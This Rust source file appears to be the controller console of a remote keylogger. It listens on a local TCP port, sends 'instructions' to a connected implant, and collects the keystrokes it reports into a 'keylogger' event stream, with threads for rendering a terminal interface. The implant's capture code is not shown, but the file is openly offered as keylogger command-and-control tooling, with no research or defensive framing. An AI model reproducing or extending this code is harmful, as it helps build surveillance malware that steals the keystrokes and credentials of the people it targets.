use std::io::prelude::*;
use std::net::{TcpListener, TcpStream, SocketAddr};
use std::sync::mpsc;
use std::thread;
use std::time::Duration;

use crate::app::AppEvent;
use crossterm::event::{self};

#[derive(Debug)]
pub struct Core {
    pub stream: TcpStream,
    pub addr: SocketAddr,
    pub sender: mpsc::Sender<AppEvent>,
    pub receiver: mpsc::Receiver<AppEvent>,
}

impl Core {
    pub fn new() -> Self {
        let listener = TcpListener::bind("127.0.0.1:7878").unwrap();

        let (stream, addr) = listener
            .accept()
            .unwrap();

        let (sender, receiver) = mpsc::channel::<AppEvent>();
        
        Core {
            stream,
            addr,
            sender,
            receiver,
        }
    }

    pub fn apply_instructions(&mut self, input: String) -> Result<(), std::io::Error> {
        self.stream.write_all(input.as_bytes())?;
        self.stream.flush()?;
        Ok(())
    }

    pub fn keylogger(&mut self) {
        let sender = self.sender.clone();
        match self.stream.try_clone() {
            Ok(mut stream) => {
                thread::spawn(move || {
                    let mut buffer = [0; 512];

                    while let Ok(bytes) = stream.read(&mut buffer[..]) { 
                        if bytes == 0 {
                            break;
                        }

                        if let Ok(key) = std::str::from_utf8(&buffer[..bytes]) {
                            if sender.send(AppEvent::Keylogger(key.to_string())).is_err() {
                                break;
                            }
                        }
                    }
                });
            }
            Err(_) => {}
        }
    }

    pub fn render_tui(&mut self) {
        let sender = self.sender.clone();
        thread::spawn(move || {
            loop {
                if sender.send(AppEvent::Render).is_err() {
                    break;
                }
                thread::sleep(Duration::from_millis(16));
            }
        });
    }

    pub fn terminal_key_event(&mut self) {
        let sender = self.sender.clone();
        thread::spawn(move || {
            loop {
                if let Some(key) = event::read().unwrap().as_key_press_event() {
                    if sender.send(AppEvent::Terminal(key)).is_err() {
                        break;
                    }
                }
            }
        });
    }
}
